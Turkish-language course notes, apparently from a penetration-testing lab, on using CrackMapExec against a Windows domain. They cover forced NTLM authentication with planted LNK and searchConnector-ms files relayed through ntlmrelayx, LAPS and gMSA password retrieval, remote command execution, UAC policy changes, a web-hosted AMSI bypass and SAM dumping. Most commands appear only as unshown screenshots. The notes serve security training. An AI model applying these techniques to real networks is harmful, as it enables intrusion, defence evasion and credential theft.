
### Local Hesapları Test Etme

![Pasted image 20241202173025.png](/img/user/resimler/Pasted%20image%2020241202173025.png)


### Her Şeyi Temizleyin
Modül ile işimiz bittiğinde, -o CLEANUP=YES seçeneğini kullanarak LNK dosyasını temizlemek ve LNK dosyasının adını NAME=important olarak belirlemek çok önemlidir.


### Cleanup
![Pasted image 20241202173114.png](/img/user/resimler/Pasted%20image%2020241202173114.png)


### drop-sc Modülü ile Hash'lerin Çalınması
Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.

Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.

CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .

İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:

* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır

* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.

* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.

Drop-sc'yi iş başında görelim:


### Dropping a searchConnector-ms File

![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)

![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)

Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.


### NTLMRelayx ve drop-sc Kullanarak Aktarma

![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)

Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:


### searchConnector-ms Dosyalarını Temizleme
![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)

LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.


### SMB ile Eşleme ve Numaralandırma

CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:

![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)

Daha önce çalışmamış olanları gözden geçirelim:

### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma

Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.


### Sessions ve loggendon-users seçeneklerini kullanma
![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)

Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.


### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)


### Enumerate Computers

CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar


### Domain'deki Bilgisayarları Numaralandırma
![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)

Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.

![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)

![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)

![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)

Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.


### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute

Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.


### List Local Users

![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)

Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.

rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.


### Enumerate Disks

Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.

### Enumerating Disks
![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)


### Local ve Domain Gruplarını Numaralandırma
Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.

### Enumerating Local Groups
![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)


### Enumerating Domain Groups
![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)

Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.


### Group **Members**
![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)

Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.


### Querying WMI
[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.

Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.

WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz

Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:


### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)

WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)

Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace
![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)

Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.

Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.


### LDAP and RDP Enumeration
Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır

Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir


### LDAP & RDP Commands
LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)

Henüz çalışmadıklarımızı gözden geçirelim.


### Enumerating Users and Groups

SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:

### Enumerating Users and Groups

![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir


### İlginç Hesap Özelliklerini Numaralandırma

ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.

PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.


### PASSWD_NOTREQD Özniteliğinin Tanımlanması

![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)

TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.

### Kısıtlamasız Delegasyonun Belirlenmesi
![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)

adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.


### adminCount Özniteliğini Sorgulama
![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)


### Domain SID'sini numaralandırma

Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:


### Gathering the Domain SID

![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)


### Group Managed Service Accounts (gMSA)

Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:

* Otomatik parola yönetimi.
* Basitleştirilmiş service principal name (SPN) yönetimi.
* Yönetimi diğer yöneticilere devretme yeteneği

Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.

Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.

Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):


### Enumerating Accounts with gMSA Privileges
![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)

Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.


### gMSA Parolasını Edinme
![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)

Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.


### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)


### RDP Screenshots
RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz


### Enumerate Login Prompt
![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)

Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.

Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır



### Taking a Screenshot
![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)


Not: --screentime ve --res isteğe bağlı bayraklardır.

Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)


Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.





### Command Execution

Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:

![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)

Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.

Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.



### Command Execution as Administrator
Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.


### Bir Komutu Administrator Olarak Çalıştırma
![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)


### RID 500 Dışı Hesap Olarak Komut Yürütme
Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:

### Komutu localadmin olarak çalıştırma
![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)

Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi Değiştirme
![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)

![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)


### Domain Hesabı Olarak Komut Yürütme
LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.


### Komutu Robert olarak çalıştır
![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)


### SMB ile Komut Yürütme
CME'nin dört (4) farklı komut yürütme yöntemi vardır:
![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)

Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.

Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:

![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)

CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:


### SMBExec Yöntemi ile Komut Yürütme
![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)

Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:


### wmiexec aracılığıyla PowerShell Komut Yürütme
![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)

PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:

12. AMSI baypas
13. Payload'u gizleyin
14. Payload'u çalıştırın

### Özel AMSI Bypass Çalıştırma

Bu teknikler PowerShell çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, --amsi-bypass seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:

15. “Değiştirilmiş Amsi ScanBuffer Yaması” içeren dosyayı indirin


### “Değiştirilmiş Amsi ScanBuffer Yaması” ile Bir Dosya Oluşturun
![Pasted image 20241203101828.png](/img/user/resimler/Pasted%20image%2020241203101828.png)
Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır

### Komut Maksimum Uzunluğu Aşıyor
![Pasted image 20241203102011.png](/img/user/resimler/Pasted%20image%2020241203102011.png)
![Pasted image 20241203102018.png](/img/user/resimler/Pasted%20image%2020241203102018.png)

16. Bu sorunu çözmek için, shantanukhande-amsi.ps1 dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.

### PowerShell Komut Dosyasını Oluşturma ve Barındırma
![Pasted image 20241203102127.png](/img/user/resimler/Pasted%20image%2020241203102127.png)

Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.

Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:


### PowerShell Özel AMSI Bypass Kullanma
![Pasted image 20241203102312.png](/img/user/resimler/Pasted%20image%2020241203102312.png)
![Pasted image 20241203102346.png](/img/user/resimler/Pasted%20image%2020241203102346.png)


### WinRM Kullanarak Komut Yürütme
WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port 5985 ve HTTPS TCP port 5986'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için yönetici olmasını gerektirmemesidir. Administrators grubunun üyesiysek, Remote Management Users grubunun üyesiysek veya oturum yapılandırmasında açık PowerShell Remoting izinlerimiz varsa WinRM protokolünü kullanabiliriz.


### Command Execution using WinRM
![Pasted image 20241203102455.png](/img/user/resimler/Pasted%20image%2020241203102455.png)
![Pasted image 20241203102501.png](/img/user/resimler/Pasted%20image%2020241203102501.png)



### WinRM aracılığıyla PowerShell Komut Yürütme
![Pasted image 20241203102608.png](/img/user/resimler/Pasted%20image%2020241203102608.png)


### Other PowerShell Options

WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:

![Pasted image 20241203102901.png](/img/user/resimler/Pasted%20image%2020241203102901.png)

Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.


### SSH Command Execution
CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.

### Command Execution with SSH
![Pasted image 20241203103019.png](/img/user/resimler/Pasted%20image%2020241203103019.png)
![Pasted image 20241203103028.png](/img/user/resimler/Pasted%20image%2020241203103028.png)
![Pasted image 20241203103033.png](/img/user/resimler/Pasted%20image%2020241203103033.png)

Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da public ve private anahtarları kullanmaktır. CrackMapExec, --key-file seçeneği ile private key kullanımını destekler. Anahtarın çalışması için OPENSSH formatında olması gerekir.


### Private Key Kullanarak SSH ile Komut Yürütme
![Pasted image 20241203103449.png](/img/user/resimler/Pasted%20image%2020241203103449.png)

Not: Herhangi bir parola yapılandırılmamışsa, -p seçeneğini boş (“”) olarak ayarlamalıyız, aksi takdirde bir hata alırız

Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.


### Gizli Bilgileri Bulma ve Kullanma
Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.

Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.


### SAM
SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.


### Dumping SAM
![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)


### NTDS Active Directory Database

